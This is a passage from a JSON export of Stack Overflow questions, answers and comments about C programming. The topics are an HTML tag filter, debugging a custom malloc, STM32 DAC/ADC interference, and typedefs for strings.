"https://stackoverflow.com/users/2979617/m-oehm"}, "is_accepted": true, "score": 2, "last_activity_date": 1457525391, "creation_date": 1457525391, "answer_id": 35891214, "question_id": 35890791, "link": "https://stackoverflow.com/questions/35890791/c-replacing-html-tags-in-a-string/35891214#35891214", "title": "C replacing html tags in a string", "body": "<p>You can establish a context that tells you whether you are inside a tag or not and then filter your sring based on that context:</p>\n\n<pre><code>    #include &lt;stdlib.h&gt;\n    #include &lt;stdio.h&gt;\n\n    void filter(char *str)\n    {\n        char *p = str;\n        int tag = 0;\n\n        while (*str) {\n            if (*str == '&lt;') tag = 1;        \n            if (!tag) *p++ = *str;        \n            if (*str == '&gt;') tag = 0;\n            str++;\n        }\n\n        *p = '\\0';\n    }\n\n    int main()\n    {\n        char line[] = \"Read &lt;a href=\\\"x.html\\\"&gt;more &lt;b&gt;here&lt;/b&gt;&lt;/a&gt;.\";\n        puts(line);\n        filter(line);\n        puts(line);\n\n        return 0;\n    }\n</code></pre>\n\n<p>This will work on well-formed HTML strings that properly escape all angle brackets that are not tag delimiters. If the line begins with a trailing open tag from the previous line, the rest of that tag will be printed.</p>\n"}], "owner": {"reputation": 115, "user_id": 1610834, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/51b0ad68b787ad16d4dda8ea0a257236?s=128&d=identicon&r=PG", "display_name": "user1610834", "link": "https://stackoverflow.com/users/1610834/user1610834"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 35891214, "answer_count": 2, "score": -1, "last_activity_date": 1457525391, "creation_date": 1457524113, "last_edit_date": 1457524935, "question_id": 35890791, "link": "https://stackoverflow.com/questions/35890791/c-replacing-html-tags-in-a-string", "title": "C replacing html tags in a string", "body": "<p>Good day all, I currently have a program that searches a html file that contains large amounts of text which includes hyperlinks in it. At the moment, I am only able to print out the entire line of text, which includes the raw html tags which I am trying to avoid. Is there a way to do this? </p>\n\n<p>Here is an example of what I am trying to achieve:</p>\n\n<p>Sample line of text in html file:</p>\n\n<pre><code>&lt;a href=\"/cgi-bin/as-report?as=AS41299&amp;view=2.0\"&gt;S/N1&lt;/a&gt; Blahblahblah\n</code></pre>\n\n<p>What I am trying to achieve:</p>\n\n<pre><code>S/N1 Blahblahblah\n</code></pre>\n\n<p>My code so far:</p>\n\n<pre><code>            while (!feof(fp)) {\n                memset(buffer, 0, buflen+1);\n                fgets(buffer, buflen, fp);\n\n                    if (strstr(buffer, asnumber)) {\n                        printf(\"\\\"%s\\\"\\n\", buffer);\n                    }\n            }\n</code></pre>\n\n<p>Any advice would be much appreciated, thank you.</p>\n"}, {"tags": ["c", "malloc"], "comments": [{"owner": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 0, "creation_date": 1457524857, "post_id": 35890638, "comment_id": 59442886, "body": "Are you sure that the header structure is correctly created? Can you show declaration?"}, {"owner": {"reputation": 270, "user_id": 4338129, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4c09a5e1192978af05563ed740e0cf03?s=128&d=identicon&r=PG&f=1", "display_name": "Dranna", "link": "https://stackoverflow.com/users/4338129/dranna"}, "reply_to_user": {"reputation": 4522, "user_id": 5157478, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bBcym.png?s=128&g=1", "display_name": "Frankie_C", "link": "https://stackoverflow.com/users/5157478/frankie-c"}, "edited": false, "score": 0, "creation_date": 1457525759, "post_id": 35890638, "comment_id": 59443507, "body": "I edited to put the structure."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 2, "creation_date": 1457525910, "post_id": 35890638, "comment_id": 59443610, "body": "<code>static Header b = NULL;</code> --&gt;&gt; <code>static Header *b = NULL;</code> maybe?"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1457526267, "post_id": 35890638, "comment_id": 59443892, "body": "<code>current+sizeof(struct header);</code> wrong pointer arithmetic."}], "answers": [{"comments": [{"owner": {"reputation": 270, "user_id": 4338129, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4c09a5e1192978af05563ed740e0cf03?s=128&d=identicon&r=PG&f=1", "display_name": "Dranna", "link": "https://stackoverflow.com/users/4338129/dranna"}, "edited": false, "score": 0, "creation_date": 1457533175, "post_id": 35893146, "comment_id": 59448830, "body": "That may be the solution to another problem. But for now, i am not able to retrieve the size attribute. Since availableHeader cannot read the size of the examined header, it cannot go &quot;correctly&quot; to the next one.  To iterate through the headers, my function should add 32 bits (sizeof header) + X bits where X is the size attribute. But since it cannot retrieve the size, the &quot;current&quot; header is not a header."}, {"owner": {"reputation": 327, "user_id": 5986090, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bPdMk.jpg?s=128&g=1", "display_name": "Peter Silon", "link": "https://stackoverflow.com/users/5986090/peter-silon"}, "reply_to_user": {"reputation": 270, "user_id": 4338129, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4c09a5e1192978af05563ed740e0cf03?s=128&d=identicon&r=PG&f=1", "display_name": "Dranna", "link": "https://stackoverflow.com/users/4338129/dranna"}, "edited": false, "score": 1, "creation_date": 1457534866, "post_id": 35893146, "comment_id": 59450143, "body": "Sure it can not. Check how pointer arithmetic works. Current + 10 does not mean move 10 bytes but 10 times the size of the referenced object. Type it to <code>(void *)</code>."}, {"owner": {"reputation": 270, "user_id": 4338129, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4c09a5e1192978af05563ed740e0cf03?s=128&d=identicon&r=PG&f=1", "display_name": "Dranna", "link": "https://stackoverflow.com/users/4338129/dranna"}, "edited": false, "score": 0, "creation_date": 1457551383, "post_id": 35893146, "comment_id": 59461933, "body": "Thanks. I worked on my code but i was stuck after that, i decided to start over from scratch. But the generic pointer helped a lot ! Thanks."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1457596291, "post_id": 35893146, "comment_id": 59480116, "body": "@PeterSilon Pointer arithmetic to <code>(void *)</code> is not allowed in Standard C. (you use it is probably an extension of the GCC) <a href=\"http://ideone.com/a7RtWo\" rel=\"nofollow noreferrer\">sample code</a>"}], "tags": [], "owner": {"reputation": 327, "user_id": 5986090, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bPdMk.jpg?s=128&g=1", "display_name": "Peter Silon", "link": "https://stackoverflow.com/users/5986090/peter-silon"}, "is_accepted": true, "score": 0, "last_activity_date": 1457530602, "creation_date": 1457530602, "answer_id": 35893146, "question_id": 35890638, "link": "https://stackoverflow.com/questions/35890638/c-custom-malloc-function-not-reading-block-size/35893146#35893146", "title": "C custom malloc function not reading block size", "body": "<p>When your <code>availableHeader</code> returns a pointer to the header which can be reused <code>(free == 1 &amp;&amp; size &gt;= s)</code> your <code>mymalloc</code> function hits the <code>if (!(current==sbrk(0)))</code> because current is not at the program break. False negate to true and you allocate new memory instead of reusing the old one.</p>\n"}], "owner": {"reputation": 270, "user_id": 4338129, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/4c09a5e1192978af05563ed740e0cf03?s=128&d=identicon&r=PG&f=1", "display_name": "Dranna", "link": "https://stackoverflow.com/users/4338129/dranna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 201, "favorite_count": 0, "accepted_answer_id": 35893146, "answer_count": 1, "score": 1, "last_activity_date": 1457530602, "creation_date": 1457523680, "last_edit_date": 1457525695, "question_id": 35890638, "link": "https://stackoverflow.com/questions/35890638/c-custom-malloc-function-not-reading-block-size", "title": "C custom malloc function not reading block size", "body": "<p>I try to implement a custom malloc function. I have issues with the size part. Since we can free a variable, the empty space can be reallocated. The custom structure is 32 bits long and contains the size of the data and a bit as a boolean (unsigned int free : 1) that says if the data is free or not.</p>\n\n<p>Here is my malloc function :</p>\n\n<pre><code>void *mymalloc(size_t size) {\nif (!size) return NULL;\nsize_t length = align(size + sizeof(struct header));\nHeader current = availableHeader(size);\nif (!(current==sbrk(0))) {\n    Header newHeader = sbrk(length);\n    if (newHeader == (void*) -1) {\n        return NULL;\n    }\n    newHeader-&gt;size = length - sizeof(struct header);\n    current = newHeader;\n\n} else if (length + sizeof(size_t) &lt; current-&gt;size) {\n\n    split(current, length);\n}\ncurrent-&gt;free = 0;\nreturn current+sizeof(struct header);\n}\n</code></pre>\n\n<p>This uses a function called \"availableHeader\" that will find the first available memory morsel, a new one if no other morsel is free AND has enough size to store the data.</p>\n\n<pre><code>Header availableHeader(size_t s) {\nHeader current = firstHeader();\nint isHeader=1;\nfor (;isHeader &amp;&amp; (!current-&gt;free || current-&gt;size &lt; s); current = current+current-&gt;size+sizeof(struct header)){\n    printf(\"%d on %d for %d\\n\", current-&gt;free, current-&gt;size, s);//TEST\n    if(current&gt;=sbrk(0)){\n        isHeader=0;\n    }\n}\nreturn current;\n}\n</code></pre>\n\n<p>And finally, this function uses \"firstHeader\" which returns the first morsel we created, it creates the first one if it's the first call.</p>\n\n<pre><code>static void *firstHeader() {\nstatic Header b = NULL;\nif (!b) {\n    b = sbrk(align(sizeof(struct header)));\n    if (b == (void*) -1) {\n        _exit(127);\n    }\n    b-&gt;size = 0;\n    b-&gt;free = 0;       \n}\nreturn b;\n}\n</code></pre>\n\n<p>Now, the problem is that \"availableHeader\" never returns an already-created block. It always results in creating a new one which is a terrible memory management strategy.\nBy testing (marked //TEST) i saw that my loop in \"availableHeader\" always sees the current memory block with \"0\" for both size and free.</p>\n\n<p>It seems like my malloc function never sets a size even though there is this line :</p>\n\n<pre><code>newHeader-&gt;size = length - sizeof(struct header);\n</code></pre>\n\n<p>But the issue stays : reading the size in \"availableHeader\" returns 0 even if it has another value. </p>\n\n<p><strong>EDIT :</strong>\nAs requested, here's the structure :</p>\n\n<pre><code>struct header {\n    unsigned int size : 29,\n                 zero :  2,\n                 free :  1;\n};\n</code></pre>\n"}, {"tags": ["c", "arm", "stm32", "adc", "digital-analog-converter"], "comments": [{"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1457526633, "post_id": 35890498, "comment_id": 59444141, "body": "A quick scan of a couple of STM32F103 datasheets suggests the DAC outputs share pins with some ADC1 inputs - is that the case on the part you&#39;re using?"}, {"owner": {"reputation": 21, "user_id": 6008911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f885dafe50538251bed62f87d43d687b?s=128&d=identicon&r=PG&f=1", "display_name": "propro", "link": "https://stackoverflow.com/users/6008911/propro"}, "reply_to_user": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1457530032, "post_id": 35890498, "comment_id": 59446574, "body": "STM32F103ZET6 That would make sense but the DAC pins are PA4 and PA5 and I definitely don&#39;t have them double defined as ADC1 inputs. I only use PA0, PA1, PA2, PA3, PA6 and PA7 from GPIOA on ADC1"}, {"owner": {"reputation": 21, "user_id": 6008911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f885dafe50538251bed62f87d43d687b?s=128&d=identicon&r=PG&f=1", "display_name": "propro", "link": "https://stackoverflow.com/users/6008911/propro"}, "reply_to_user": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 0, "creation_date": 1457533669, "post_id": 35890498, "comment_id": 59449220, "body": "Ok, when I disable one of the DAC channels config the other will work. This works both ways. , I have added the DAC_Configuration()"}], "owner": {"reputation": 21, "user_id": 6008911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f885dafe50538251bed62f87d43d687b?s=128&d=identicon&r=PG&f=1", "display_name": "propro", "link": "https://stackoverflow.com/users/6008911/propro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2198, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1533439787, "creation_date": 1457523331, "last_edit_date": 1533439787, "question_id": 35890498, "link": "https://stackoverflow.com/questions/35890498/stm32f103-dac-and-adc-wont-run-concurrently", "title": "STM32F103 DAC and ADC won&#39;t run concurrently", "body": "<p>I have a thread set up to constantly read 18 ADCs across ADC1 and ADC3 and fill them into arrays. </p>\n\n<pre><code>void TSK_AdcSensor(void const *argument){\n\nADC1_Configuration();\nADC3_Configuration();\n\n//Clear the ADC value registers\nfor (i=0; i&lt;MAX_ADC1_CHANNELS; i++){\n    adc1Sensor[i] = 0;\n}  \n\nfor (i=0; i&lt;MAX_ADC3_CHANNELS; i++){\n    adc3Sensor[i] = 0;\n}\n\nwhile(1){\n    //Start ADC1 software conversion\n    ADC_SoftwareStartConvCmd(ADC1, ENABLE);\n\n    //Start ADC3 software conversion\n    ADC_SoftwareStartConvCmd(ADC3, ENABLE);\n\n    //wait for DMA to finish:\n    result1 = osSignalWait(ADC1FINISHED, osWaitForever);\n    result2 = osSignalWait(ADC3FINISHED, osWaitForever);\n\n\n    for(i=0; i&lt;MAX_ADC1_CHANNELS; i++){\n        adc1Sensor[i] += ADC1_SensorValues[i];\n    }\n\n    for(j=0; j&lt;MAX_ADC3_CHANNELS; j++){\n        adc3Sensor[j] += ADC3_SensorValues[j];\n    }\n\n\n    ADCcounter++;\n\n\n    if(ADCcounter&gt;=100){\n        for(i=0; i&lt;MAX_ADC1_CHANNELS; i++){\n            adcSensor[i]=(float)adc1Sensor[i]/ADCcounter;\n            adc1Sensor[i]=0;\n            //printf(\"\\n\\radc1[%i]=%.1f\\n\\r\",i,adcSensor[i]);\n        }\n        for(j=0; j&lt;MAX_ADC3_CHANNELS; j++){\n            adcSensor[j+MAX_ADC1_CHANNELS]=(float)adc3Sensor[j]/ADCcounter;\n            adc3Sensor[j]=0;\n            //printf(\"\\n\\radc3[%i]=%.1f\\n\\r\",j,adcSensor[j+MAX_ADC1_CHANNELS]);\n        }\n        ADCcounter=0;\n    }\n\n    osDelay(5);\n\n}//end while(1)\n}\n</code></pre>\n\n<p>I also have a function that sets one of two output DAC channels upon receipt of the desired setting from the usart</p>\n\n<pre><code>void RegSetDAC(u8 reg_select, u16 reg_value)\n{  \nDAC_Configuration();\n\nif(reg_select == 1)\n{\n    if(reg_value &gt; 1250)\n    printf(\"\\n\\r *E*0** regulator 1 out of range\\n\\r\");\n\n    else\n    {                    \n        dac_value1=0;  \n        dac_value1=EPC1(reg_value);\n        osDelay(100);\n        // Set DAC Channel2 DHR12Rregister\n        DAC_SetChannel2Data(DAC_Align_12b_R,  dac_value1);\n        // Start DAC Channel2 conversion by software\n        DAC_SoftwareTriggerCmd(DAC_Channel_2, ENABLE); \n        printf(\"*E*%u*%u**\\t\\n\\r  \" ,reg_select,reg_value);\n    }\n}\n\nelse if (reg_select == 2)\n{  \n    if(reg_value &gt; 100)\n        printf(\"\\n\\r *E*0** regulator 2 out of range\\n\\r\");\n\n    else\n    {\n            dac_value2=0;\n        dac_value2=EPC2(reg_value);\n        osDelay(100);\n\n        // Set DAC Channel1 DHR12R register\n        DAC_SetChannel1Data(DAC_Align_12b_R, dac_value2);\n        // Start DAC Channel1 conversion by software\n            DAC_SoftwareTriggerCmd(DAC_Channel_1, ENABLE);\n            printf(\"*E*%u*%u**\\t\\n\\r  \" ,reg_select,reg_value);\n        }\n    }  \n//      printf(\"*%f*%f**\\t\\n\\r  \" ,dac_value1,dac_value2);\n}\n</code></pre>\n\n<p>The dac function works perfectly, until I enable the thread <code>TSK_AdcSensor</code>.<br>\nThe dac output will then give nonsense values.</p>\n\n<p>By process of elimination I have found that commenting:</p>\n\n<pre><code>// ADC1_Configuration();\n// ADC3_Configuration();\n</code></pre>\n\n<p>and</p>\n\n<pre><code>//Start ADC1software conversion\n//  ADC_SoftwareStartConvCmd(ADC1,ENABLE);\n\n//Start ADC3 softwareconversion\n//  ADC_SoftwareStartConvCmd(ADC3, ENABLE);\n</code></pre>\n\n<p>Allow the dac to work as normal. But I cannot see why? </p>\n\n<p>The <code>printf</code> after I set the DAC channel shows the correct value, but the voltage reading at the output does not correspond.</p>\n\n<p>Anyone have any idea's?</p>\n\n<p>DAC Config </p>\n\n<pre><code>  void DAC_Configuration(void)\n{\n    DAC_InitTypeDef DAC_InitStructure;\n\n\n    dac_GPIO();\n    dac_RCC();\n\n    //DAC channel1 Configuration (Digital Regulator 2)\n    DAC_InitStructure.DAC_Trigger = DAC_Trigger_Software;\n    DAC_InitStructure.DAC_WaveGeneration = DAC_WaveGeneration_None;\n    DAC_InitStructure.DAC_OutputBuffer = DAC_OutputBuffer_Disable;\n    DAC_Init(DAC_Channel_1, &amp;DAC_InitStructure); \n\n    //DAC channel2 Configuration (Digital Regulator 1)\n    DAC_InitStructure.DAC_Trigger = DAC_Trigger_Software;\n    DAC_InitStructure.DAC_WaveGeneration = DAC_WaveGeneration_None;\n    DAC_InitStructure.DAC_OutputBuffer = DAC_OutputBuffer_Disable;\n    DAC_Init(DAC_Channel_2, &amp;DAC_InitStructure); \n\n//  // Enable DAC Channel1 reg 2\n    DAC_Cmd(DAC_Channel_1, ENABLE);\n    // Enable DAC Channel2 reg 1\n    DAC_Cmd(DAC_Channel_2, ENABLE); \n\n  // Set default analog output as zero */\n  DAC_SetChannel2Data(DAC_Align_12b_R, 0x0000);  // PA5 \n    //  // Set default analog output as zero */\n  DAC_SetChannel1Data(DAC_Align_12b_R, 0x0000);  // PA4     \n}\n</code></pre>\n"}, {"tags": ["c", "typedef"], "comments": [{"owner": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 3, "creation_date": 1457522856, "post_id": 35890237, "comment_id": 59441429, "body": "what do you mean by neither of them works? Do you get an error or a wrong behaviour?"}, {"owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "edited": false, "score": 0, "creation_date": 1457522897, "post_id": 35890237, "comment_id": 59441451, "body": "Can you provide an error message and a relevant code snippet?"}, {"owner": {"reputation": 181, "user_id": 5395685, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/0f66922f103c14af1bdc56ba01c05706?s=128&d=identicon&r=PG&f=1", "display_name": "s d", "link": "https://stackoverflow.com/users/5395685/s-d"}, "reply_to_user": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 0, "creation_date": 1457523095, "post_id": 35890237, "comment_id": 59441620, "body": "@Nadir when I push a string into the arraylist, it doesn&#39;t store the actual string. i.e. I push &quot;John&quot;  into the arraylist and the value is null for that element."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1457523100, "post_id": 35890237, "comment_id": 59441625, "body": "The typedef syntax corresponds to the normal declaration syntax for identifiers. Instead of an object identifier, a type identifier is declared though. Your <code>typedef char* ItemType;</code> should work. Your <code>typedef char[] ItemType</code> is C# syntax and illegal in C. I&#39;m also not sure whether the absence of an array size (in correct syntax, like <code>typedef char ItemType[]</code>) is possible, and if so, whether it would declare an incomplete array type or a pointer type."}, {"owner": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 1, "creation_date": 1457523186, "post_id": 35890237, "comment_id": 59441698, "body": "Post a code snippet where you use ItemType and you push it into the arraylist"}, {"owner": {"reputation": 456, "user_id": 5276705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5e8bd54c7b2823d28abc6dbee63f3e0b?s=128&d=identicon&r=PG", "display_name": "SKD", "link": "https://stackoverflow.com/users/5276705/skd"}, "edited": false, "score": 0, "creation_date": 1457524124, "post_id": 35890237, "comment_id": 59442429, "body": "<code>typedef (char*) ItemType</code>  should work"}, {"owner": {"reputation": 181, "user_id": 5395685, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/0f66922f103c14af1bdc56ba01c05706?s=128&d=identicon&r=PG&f=1", "display_name": "s d", "link": "https://stackoverflow.com/users/5395685/s-d"}, "reply_to_user": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 0, "creation_date": 1457525153, "post_id": 35890237, "comment_id": 59443090, "body": "@Nadir posted code snippet of the .c implementation."}, {"owner": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 1, "creation_date": 1457525333, "post_id": 35890237, "comment_id": 59443213, "body": "If you declare <code>ItemType</code> as <code>char*</code>, you dont need to do <code>ItemTYpe * ..</code>, because that way you are creating a char **. Try using <code>ItemType temp = malloc...</code>"}, {"owner": {"reputation": 181, "user_id": 5395685, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/0f66922f103c14af1bdc56ba01c05706?s=128&d=identicon&r=PG&f=1", "display_name": "s d", "link": "https://stackoverflow.com/users/5395685/s-d"}, "reply_to_user": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 0, "creation_date": 1457525939, "post_id": 35890237, "comment_id": 59443634, "body": "@Nadir i added the .h header snippets. pushed a string &quot;John&quot; in and got null. In the terminal it printed: <code>John inserted:(null) </code>"}, {"owner": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 1, "creation_date": 1457526078, "post_id": 35890237, "comment_id": 59443741, "body": "When printing, you are taking the data from <code>listptr-&gt;size</code>, which points to the tail of the arraylist (which has no element). If you want the last element, do <code>printf(&quot;%s inserted:%s &quot;, item, listptr-&gt;data[listptr-&gt;size - 1]);</code>"}, {"owner": {"reputation": 181, "user_id": 5395685, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/0f66922f103c14af1bdc56ba01c05706?s=128&d=identicon&r=PG&f=1", "display_name": "s d", "link": "https://stackoverflow.com/users/5395685/s-d"}, "reply_to_user": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 0, "creation_date": 1457526618, "post_id": 35890237, "comment_id": 59444133, "body": "@Nadir oh I see, that makes sense. Thanks. Also if wanted to print the entire arraylist would it just be this: <code>for(i = 0; i &lt; listptr-&gt;size; i++)     printf(&quot;%s &quot;, listptr-&gt;data[i]);</code>"}, {"owner": {"reputation": 181, "user_id": 5395685, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/0f66922f103c14af1bdc56ba01c05706?s=128&d=identicon&r=PG&f=1", "display_name": "s d", "link": "https://stackoverflow.com/users/5395685/s-d"}, "reply_to_user": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 0, "creation_date": 1457527590, "post_id": 35890237, "comment_id": 59444811, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/105808/discussion-between-s-d-and-nadir\">continue this discussion in chat</a>."}, {"owner": {"reputation": 12180, "user_id": 3150802, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ulVTa.png?s=128&g=1", "display_name": "Peter - Reinstate Monica", "link": "https://stackoverflow.com/users/3150802/peter-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1457614652, "post_id": 35890237, "comment_id": 59492643, "body": "You are re-implementing c++&#39;s std::vector, kindof. By changing the typedef for ItemType it&#39;s almost a template ;-)."}], "answers": [{"tags": [], "owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "is_accepted": false, "score": 7, "last_activity_date": 1593525803, "last_edit_date": 1593525803, "creation_date": 1457524129, "answer_id": 35890795, "question_id": 35890237, "link": "https://stackoverflow.com/questions/35890237/how-to-create-a-type-definition-for-a-string-in-c/35890795#35890795", "title": "How to create a type definition for a string in c", "body": "<p>It depends on what you mean by &quot;string&quot;.</p>\n<p>If you mean an array of <code>char</code> that can be passed to functions like <code>strcpy()</code>, it is easy</p>\n<pre><code>  typedef char ItemType[10];\n</code></pre>\n<p>declares <code>ItemType</code> to be an array of <code>char</code>, which can hold any C-style string for which <code>strlen()</code> returns <code>9</code> or less (the difference of <code>1</code> is due to the terminating <code>'\\0'</code> terminator that string related functions (<code>strcmp()</code>, <code>strcat()</code>, <code>strlen()</code>) look for to mark the end of the string).</p>\n<p>The limitation is that the size is fixed.    Write 20 characters to an <code>ItemType</code> (e.g. using <code>strcpy()</code>) and behaviour is undefined.   It is your responsibility to ensure too many characters are not written to an <code>ItemType</code>.</p>\n<p>If you mean some type that can hold an arbitrary length string, where YOUR code has to manage things to ensure the data storage is large enough, you can do things like</p>\n<pre><code>  typedef char *ItemType;\n</code></pre>\n<p>The problem with this is that your code needs to manage the memory that pointer points at.    <code>ItemType</code> is a pointer, not an array which can hold data.</p>\n<pre><code> #include &lt;stdlib.h&gt;    /*  declares malloc(), realloc(), free(), etc */\n\n /*   and in a function somewhere */\n \n ItemType x = malloc(25);\n\n  /*   can use any operations that do not copy more than 24 characters to x  */\n  /*  but if we want a larger string, we have to manage it   */\n\n  ItemType temp = realloc(x, 50);\n\n  if (temp == NULL)   /*  reallocation failed */\n  {\n       /* work out how to recover or terminate */\n  }\n  else\n  {\n       x = temp;\n  } \n\n   /*  If reallocation failed and no recovery is done, do not execute the following code */\n\n  /* can now treat x as an array of 50 characters (i.e. if we ensure strlen(x) never exceeds 49 */\n\n\n  free(x);    /*  when we are done with x */\n</code></pre>\n<p>If you want a string type that will resize itself as needed (e.g. as provided by some other languages) then there is no way in C.</p>\n"}, {"comments": [{"owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "edited": false, "score": 1, "creation_date": 1457524599, "post_id": 35890903, "comment_id": 59442735, "body": "In C, don&#39;t cast the result of <code>malloc()</code>.   It causes undefined behaviour if you have forgotten to <code>#include &lt;stdlib.h&gt;</code>.   If you <code>#include &lt;stdlib.h&gt;</code> the cast is not required (unless you are using a C++ compiler)."}], "tags": [], "owner": {"reputation": 94, "user_id": 5607380, "user_type": "registered", "profile_image": 